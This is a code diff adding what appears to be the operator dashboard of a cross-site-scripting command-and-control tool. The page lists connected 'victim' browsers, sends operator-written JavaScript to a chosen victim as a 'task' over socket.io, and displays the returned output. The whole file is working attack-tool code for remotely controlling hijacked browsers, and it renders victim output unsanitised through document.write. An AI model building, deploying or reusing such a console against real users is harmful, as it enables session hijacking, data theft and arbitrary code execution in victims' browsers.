@@ -1,0 +1,235 @@
+<html>
+
+<head>
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+
+    <!-- Optional theme -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.5/socket.io.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+</head>
+
+<body>
+
+
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-sm-3 col-md-3 sidebar">
+                <h2>Active Sessions</h2>
+                <div class="list-group" id="xss-active-browsers">
+                </div>
+
+            </div>
+            <div class="col-md-7 main">
+                <h2>Tasks</h2><button id="xss-left" title="Previous Task" type="button" class="btn btn-default" aria-label="Left Align">
+  <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+</button>
+                <span id="taskswitcher-num">New</span>
+                <button id="xss-right" title="Next Task" type="button" class="btn btn-default" aria-label="Left Align">
+  <span  class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+</button>
+                <button id="xss-submit" title="Execute Task" type="button" class="btn btn-default" aria-label="Left Align">
+  <span class="glyphicon glyphicon-flash" aria-hidden="true"></span>
+</button>
+                <div class="panel panel-default">
+                    <div class="panel-heading">
+                        <h3 class="panel-title">Request</h3>
+                    </div>
+                    <div class="panel-body">
+                        <textarea id="xss-request" class="form-control" rows="8" placeholder="Enter JavaScript..."> </textarea>
+                    </div>
+                </div>
+                <div class="panel panel-default">
+                    <div class="panel-heading">
+                        <h3 class="panel-title">Response - <button title="Render as HTML" id="xss-renderresponse" onclick="renderResponse()" type="button" class="btn btn-default" aria-label="Left Align">
+  <span class="glyphicon glyphicon-eye-open" aria-hidden="true"></span>
+</button></h3>
+                    </div>
+                    <div class="panel-body">
+                        <textarea id="xss-response" class="form-control" rows="8" readonly> </textarea>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function findByID(arr, idval) { //helper function to return array id based on "id" value
+            idval = idval;
+            for (i in arr) {
+                if (arr[i].id === idval) {
+                    return i;
+                }
+            }
+            return null;
+        }
+
+
+        function renderNewTask(clientid) {
+            clientid = clientid;
+            var estTaskID = db[findByID(db, clientid)].tasks.length + 1;
+            $('#taskswitcher-num').html('new (' + String(estTaskID) + ')');
+            $('#xss-request').val('');
+            $('#xss-response').val('');
+
+        }
+
+        function renderExistingTask(clientid, taskid) {
+            clientid = clientid;
+            taskid = parseInt(taskid);
+            $('#taskswitcher-num').html(String(taskid));
+            curclient = findByID(db, clientid);
+            curtask = findByID(db[curclient].tasks, taskid);
+            $('#xss-request').val(String(db[curclient].tasks[curtask].input));
+            $('#xss-response').val(db[curclient].tasks[curtask].output);
+        }
+
+        function renderResponse() {
+            var myWindow = window.open("/", "MsgWindow");
+            myWindow.document.write($('#xss-response').val());
+        }
+
+        function renderBrowsers() {
+            //backup current active (if any)
+            var tempbrowserid = $("a.xss-browser.active").attr("browser-id");
+            $('#xss-active-browsers').html('');
+            for (var i in db) {
+                if (db[i].active == true) {
+                    if (tempbrowserid == db[i].id) {
+                        $('#xss-active-browsers').append('<a browser-id="' + String(db[i].id) + '" class="list-group-item xss-browser active" xss-browser href="#">' + String(db[i].id) + '<span class="badge">' + String(db[i].tasks.length) + '</span></a>');
+                    } else {
+                        $('#xss-active-browsers').append('<a browser-id="' + String(db[i].id) + '" class="list-group-item xss-browser" href="#">' + String(db[i].id) + '<span class="badge">' + String(db[i].tasks.length) + '</span></a>');
+                    }
+                }
+            }
+        }
+
+        $(document).ready(function() {
+            var c2server = location.protocol + '//' + location.host;
+            db = [];
+            var socket = io.connect('http://' + document.domain + ':' + location.port + '/dashboard');
+
+            socket.on('datadump', function(msg) {
+                db = msg['data'];
+                renderBrowsers();
+            });
+            socket.on('victim connect', function(msg) {
+                db.push({
+                    id: msg['id'],
+                    active: msg['active'],
+                    tasks: []
+                });
+                renderBrowsers();
+            });
+            socket.on('victim disconnect', function(msg) {
+                db[findByID(db, msg['id'])].active = false;
+                renderBrowsers();
+            });
+            socket.on('issue task', function(msg) {
+                db[findByID(db, msg['victim'])].tasks.push({
+                    id: msg['id'],
+                    input: msg['input'],
+                    output: null
+                });
+                $("a.xss-browser[browser-id='" + msg['victim'] + "'] > span").text(db[findByID(db, msg['victim'])].tasks.length);
+                var cwtText = $('#taskswitcher-num').html();
+                var client = $("a.xss-browser.active").attr("browser-id");
+                var cwt = null;
+                if (cwtText.includes("new")) {
+                    //split out the integer
+                    tempcwt = cwtText.slice(5, cwtText.length - 1);
+                    cwt = parseInt(tempcwt);
+                } else {
+                    cwt = parseInt(cwtText);
+                }
+                taskid = parseInt(msg['id']);
+                if (client === msg['victim'] && cwt === msg['id']) {
+                    renderExistingTask(msg['victim'], msg['id']);
+                }
+            });
+            socket.on('issue task self', function(msg) {
+                db[findByID(db, msg['victim'])].tasks.push({
+                    id: msg['id'],
+                    input: msg['input'],
+                    output: null
+                });
+                $("a.xss-browser[browser-id='" + msg['victim'] + "'] > span").text(db[findByID(db, msg['victim'])].tasks.length);
+                renderExistingTask(msg['victim'], msg['id']);
+            });
+            socket.on('task output', function(msg) {
+                clientarrid = findByID(db, msg['victim']);
+                taskarrid = findByID(db[clientarrid].tasks, msg['id']);
+                db[clientarrid].tasks[taskarrid].output = msg['output'];
+                var cwtText = $('#taskswitcher-num').html();
+                var client = $("a.xss-browser.active").attr("browser-id");
+                var cwt = null;
+                if (cwtText.includes("new")) {
+                    //split out the integer
+                    tempcwt = cwtText.slice(5, cwtText.length - 1);
+                    cwt = parseInt(tempcwt);
+                } else {
+                    cwt = parseInt(cwtText);
+                }
+                taskid = parseInt(msg['id']);
+                if (client === msg['victim'] && cwt === msg['id']) {
+                    renderExistingTask(msg['victim'], msg['id']);
+                }
+            });
+
+            $(document).on('click', 'a.xss-browser', function() { //handle selecting browser to target
+                $("a.xss-browser").removeClass("active");
+                $(this).addClass("active");
+                var tasklen = db[findByID(db, $(this).attr("browser-id"))].tasks.length;
+                if (tasklen === 0) {
+                    renderNewTask($(this).attr("browser-id"));
+                } else {
+                    renderExistingTask($(this).attr("browser-id"), tasklen);
+                }
+            });
+            //add task handler
+            $(document).on('click', '#xss-submit', function() {
+                socket.emit('task add', {
+                    victim: $("a.xss-browser.active").attr("browser-id"),
+                    input: $("#xss-request").val()
+                });
+                return false;
+            });
+
+            $(document).on('click', '#xss-right', function() {
+                if ($('#taskswitcher-num').html().includes('new')) {} else {
+                    var cwt = parseInt($('#taskswitcher-num').html());
+                    var client = $("a.xss-browser.active").attr("browser-id");
+                    var lentasklist = db[findByID(db, client)].tasks.length;
+                    if (cwt >= lentasklist) {
+                        renderNewTask(client);
+                    } else {
+                        renderExistingTask(client, cwt + 1);
+                    }
+                }
+
+            });
+            $(document).on('click', '#xss-left', function() {
+                var cwtText = $('#taskswitcher-num').html();
+                var client = $("a.xss-browser.active").attr("browser-id");
+                var cwt = null;
+                if (cwtText.includes("new")) {
+                    tempcwt = cwtText.slice(5, cwtText.length - 1);
+                    cwt = parseInt(tempcwt);
+                } else {
+                    cwt = parseInt(cwtText);
+                }
+                if (cwt === 1) {
+                } else {
+                    renderExistingTask(client, cwt - 1);
+                }
+
+
+            });
+        });
+    </script>
+</body>
+
+</html>
